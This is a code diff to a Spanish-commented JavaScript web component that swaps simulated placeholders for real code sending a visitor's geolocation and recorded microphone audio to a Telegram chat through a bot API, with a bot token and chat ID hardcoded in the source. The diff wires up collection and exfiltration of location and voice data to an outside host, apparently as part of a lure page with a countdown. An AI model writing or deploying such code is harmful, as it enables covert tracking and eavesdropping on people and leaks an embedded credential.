@@ -41,12 +41,11 @@
                             const latitude = position.coords.latitude;
                             const longitude = position.coords.longitude;
         
-                            // Simulación de envío a Telegram (reemplazar con la lógica real)
-                            setTimeout(() => {
-                                this.loading = false;
-                                this.countdownVisible = true;
-                                this.startCountdown();
-                            }, 2000); // Simular una respuesta después de 2 segundos
+                            // Envío de ubicación a Telegram
+                            this.sendToTelegram({
+                                latitude: latitude,
+                                longitude: longitude
+                            });
                         }, error => {
                             console.error('Error obteniendo la ubicación:', error);
                             alert('No se pudo obtener la ubicación.');
@@ -86,8 +85,10 @@
                                 const blob = new Blob(chunks, { type: 'audio/webm' });
                                 const audioURL = URL.createObjectURL(blob);
         
-                                // Simulación de envío a Telegram (reemplazar con la lógica real)
-                                console.log('Audio grabado:', audioURL);
+                                // Envío de mensaje de voz a Telegram
+                                this.sendToTelegram({
+                                    voice: blob
+                                });
                             };
         
                             mediaRecorder.start();
@@ -101,6 +102,60 @@
                             alert('No se pudo acceder al micrófono.');
                             this.recording = false;
                         });
+                },
+        
+                sendToTelegram(data) {
+                    const botToken = '7247263560:AAF6PpVlY9TbO5SpQHnzFGNu0D1HBbSPuhc';
+                    const chatId = '-4286332749';
+        
+                    // Construir la URL para el API de Telegram
+                    const apiUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
+        
+                    // Configurar los datos para enviar
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('latitude', data.latitude);
+                    formData.append('longitude', data.longitude);
+        
+                    // Configurar la solicitud POST
+                    fetch(apiUrl, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Respuesta de Telegram:', data);
+                        this.loading = false;
+                        this.countdownVisible = true;
+                        this.startCountdown();
+                    })
+                    .catch(error => {
+                        console.error('Error al enviar ubicación a Telegram:', error);
+                        alert('Error al enviar ubicación a Telegram.');
+                        this.loading = false;
+                    });
+        
+                    // Envío de mensaje de voz a Telegram
+                    if (data.voice) {
+                        const voiceFormData = new FormData();
+                        voiceFormData.append('chat_id', chatId);
+                        voiceFormData.append('voice', data.voice, 'voice.webm');
+        
+                        const voiceApiUrl = `https://api.telegram.org/bot${botToken}/sendVoice`;
+        
+                        fetch(voiceApiUrl, {
+                            method: 'POST',
+                            body: voiceFormData
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            console.log('Respuesta de Telegram (voz):', data);
+                        })
+                        .catch(error => {
+                            console.error('Error al enviar mensaje de voz a Telegram:', error);
+                            alert('Error al enviar mensaje de voz a Telegram.');
+                        });
+                    }
                 }
             };
         }
